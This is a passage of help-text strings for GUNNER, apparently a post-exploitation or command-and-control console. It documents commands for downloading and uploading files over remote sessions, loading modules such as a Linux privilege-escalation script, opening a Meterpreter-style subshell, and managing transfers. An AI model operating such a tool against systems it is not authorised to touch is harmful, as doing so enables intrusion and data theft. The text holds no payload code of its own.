	"download": """download -i <session_id> -f <remote_file> -o <local_file>\n-i <session_id>   Specify the session ID from which to download the file.\n-f <remote_file>  The path of the remote file to download.\n-o <local_file>   The local path where the file will be saved.\n\nExample:\ndownload -i 12345 -f /home/user/file.txt -o /tmp/file.txt""",
	"upload": """upload -i <session_id> -l <local_file> -r <remote_file>\n-i <session_id>   Specify the session ID to which to upload the file.\n-l <local_file>   The local file to upload.\n-r <remote_file>  The path on the remote system to upload the file to.\n\nExample:\nupload -i 12345 -l /tmp/localfile.txt -r /home/user/remotefile.txt""",
	"banner": """banner
Clears the screen and displays the GUNNER ASCII-art banner.
Example: banner
""",
"search": """search <keyword>
Searches for available modules that match the provided keyword. Supports partial matching.

Example:
	search whoami
	search windows/x64
""",
"use": """use <module_name_or_number>
Selects a module by its full path or the number shown in the last `search` results, then enters its module prompt.

Inside the module prompt:
	show options       - List all configurable options
	set <opt> <value>  - Set a module option
	info               - Show module description and options
	run                - Execute the module
	back               - Exit module prompt and return to main

Examples:
	use linux/privilege_escalation/linpeas
	use 4
""",
"shelldefence": """shelldefence <on|off>
Toggle the Session-Defender runtime checks.

Usage:
	shelldefence on    Enable command‐inspection guard
	shelldefence off   Disable command‐inspection guard""",
"gunnershell": """gunnershell <session_id_or_alias>
Starts a Meterpreter-style Gunner subshell on the specified session.""",

"xfer": {
    "_desc": """xfer <subcommand>

Subcommands:
    xfer list                                List transfers (optionally scoped to a session)
    xfer status -t <tid|pattern> [-i <sid>]  Show detailed status of one transfer
    xfer resume -t <tid|pattern> [-i <sid>]  Resume a paused/failed transfer
    xfer cancel -t <tid|pattern> [-i <sid>]  Cancel a running transfer
    xfer clear [ -a | -t tid | -i sid | -f ] Clear entries from the local transfer store

Notes:
    - <sid> may be a session ID or alias; wildcards are supported (e.g., 2g*).
    - <tid|pattern> accepts a full TID, a unique prefix, or a simple * wildcard (e.g., a97*, *db4*, bd1a*5e).
    - Transfers run silently; use `xfer status` or `xfer list` to monitor progress.""",

    "list": """xfer list [-i <sid>]
List all known transfers in a compact, width-aware table.

Columns:
    SID, TID, dir, type, status, progress (% and bytes), rate (avg), path (src → dst)

Behavior:
    - Sorted with interesting items first (error/paused/running), then by most recent update.
    - Paths are middle-ellipsized to fit your terminal width.

Options:
    -i <sid>     Session ID or alias (supports wildcards, e.g., 2g*)

Examples:
    xfer list
    xfer list -i 2g*""",

    "status": """xfer status -t <tid|pattern> [-i <sid>]
Show detailed status/progress for a specific transfer.

Options:
    -t <tid|pattern>   Full TID, unique prefix, or * wildcard pattern (e.g., a97*, *db4*, bd1a*5e)
    -i <sid>           (Optional) Restrict search to a specific session (supports wildcards)

Behavior:
    - If multiple transfers match, you'll be shown an 'ambiguous' message listing candidates.
    - If a transfer was moved to a new session, you can pass -i to rebind and resume.

Examples:
    xfer status -t a97*
    xfer status -t a97da845db48
    xfer status -t *db4* -i qmg53-*""",

    "resume": """xfer resume -t <tid|pattern> [-i <sid>]
Resume a paused or previously failed transfer (download or upload).

Options:
    -t <tid|pattern>   Full TID, unique prefix, or * wildcard pattern
    -i <sid>           (Optional) Restrict search to a specific session (supports wildcards)

Examples:
    xfer resume -t a97*
    xfer resume -t ffe363219b6f -i 2g*""",

    "cancel": """xfer cancel -t <tid|pattern> [-i <sid>]
Cancel a running transfer.

Options:
    -t <tid|pattern>   Full TID, unique prefix, or * wildcard pattern
    -i <sid>           (Optional) Restrict search to a specific session (supports wildcards)

Examples:
    xfer cancel -t a97*
    xfer cancel -t ffe363219b6f -i 2g*""",

    "clear": """xfer clear [ -a | -t <tid[,tid2,...]> | -i <sid-pattern> | -f <file> ]
Delete transfer history entries from the local transfer store.

Selectors (choose ONE):
    -a                     Clear ALL transfers for ALL sessions
    -t <tid[,tid2,...]>    Clear one or more TIDs (supports unique prefixes, comma-separated)
    -i <sid-pattern>       Clear ALL transfers for sessions matching <sid-pattern> (wildcards OK)
    -f <file>              Clear TIDs listed in <file> (one per line, comments with '#')

Examples:
    xfer clear -a
    xfer clear -t ffe3632
    xfer clear -t 463a4e37fbab,92bd483f6924
    xfer clear -i 2g3sj-*
    xfer clear -f /tmp/tids.txt

Notes:
    - If any matching transfer is still RUNNING, it will be cancelled first.
    - Safe: only paths within the local transfer store are touched."""
},


}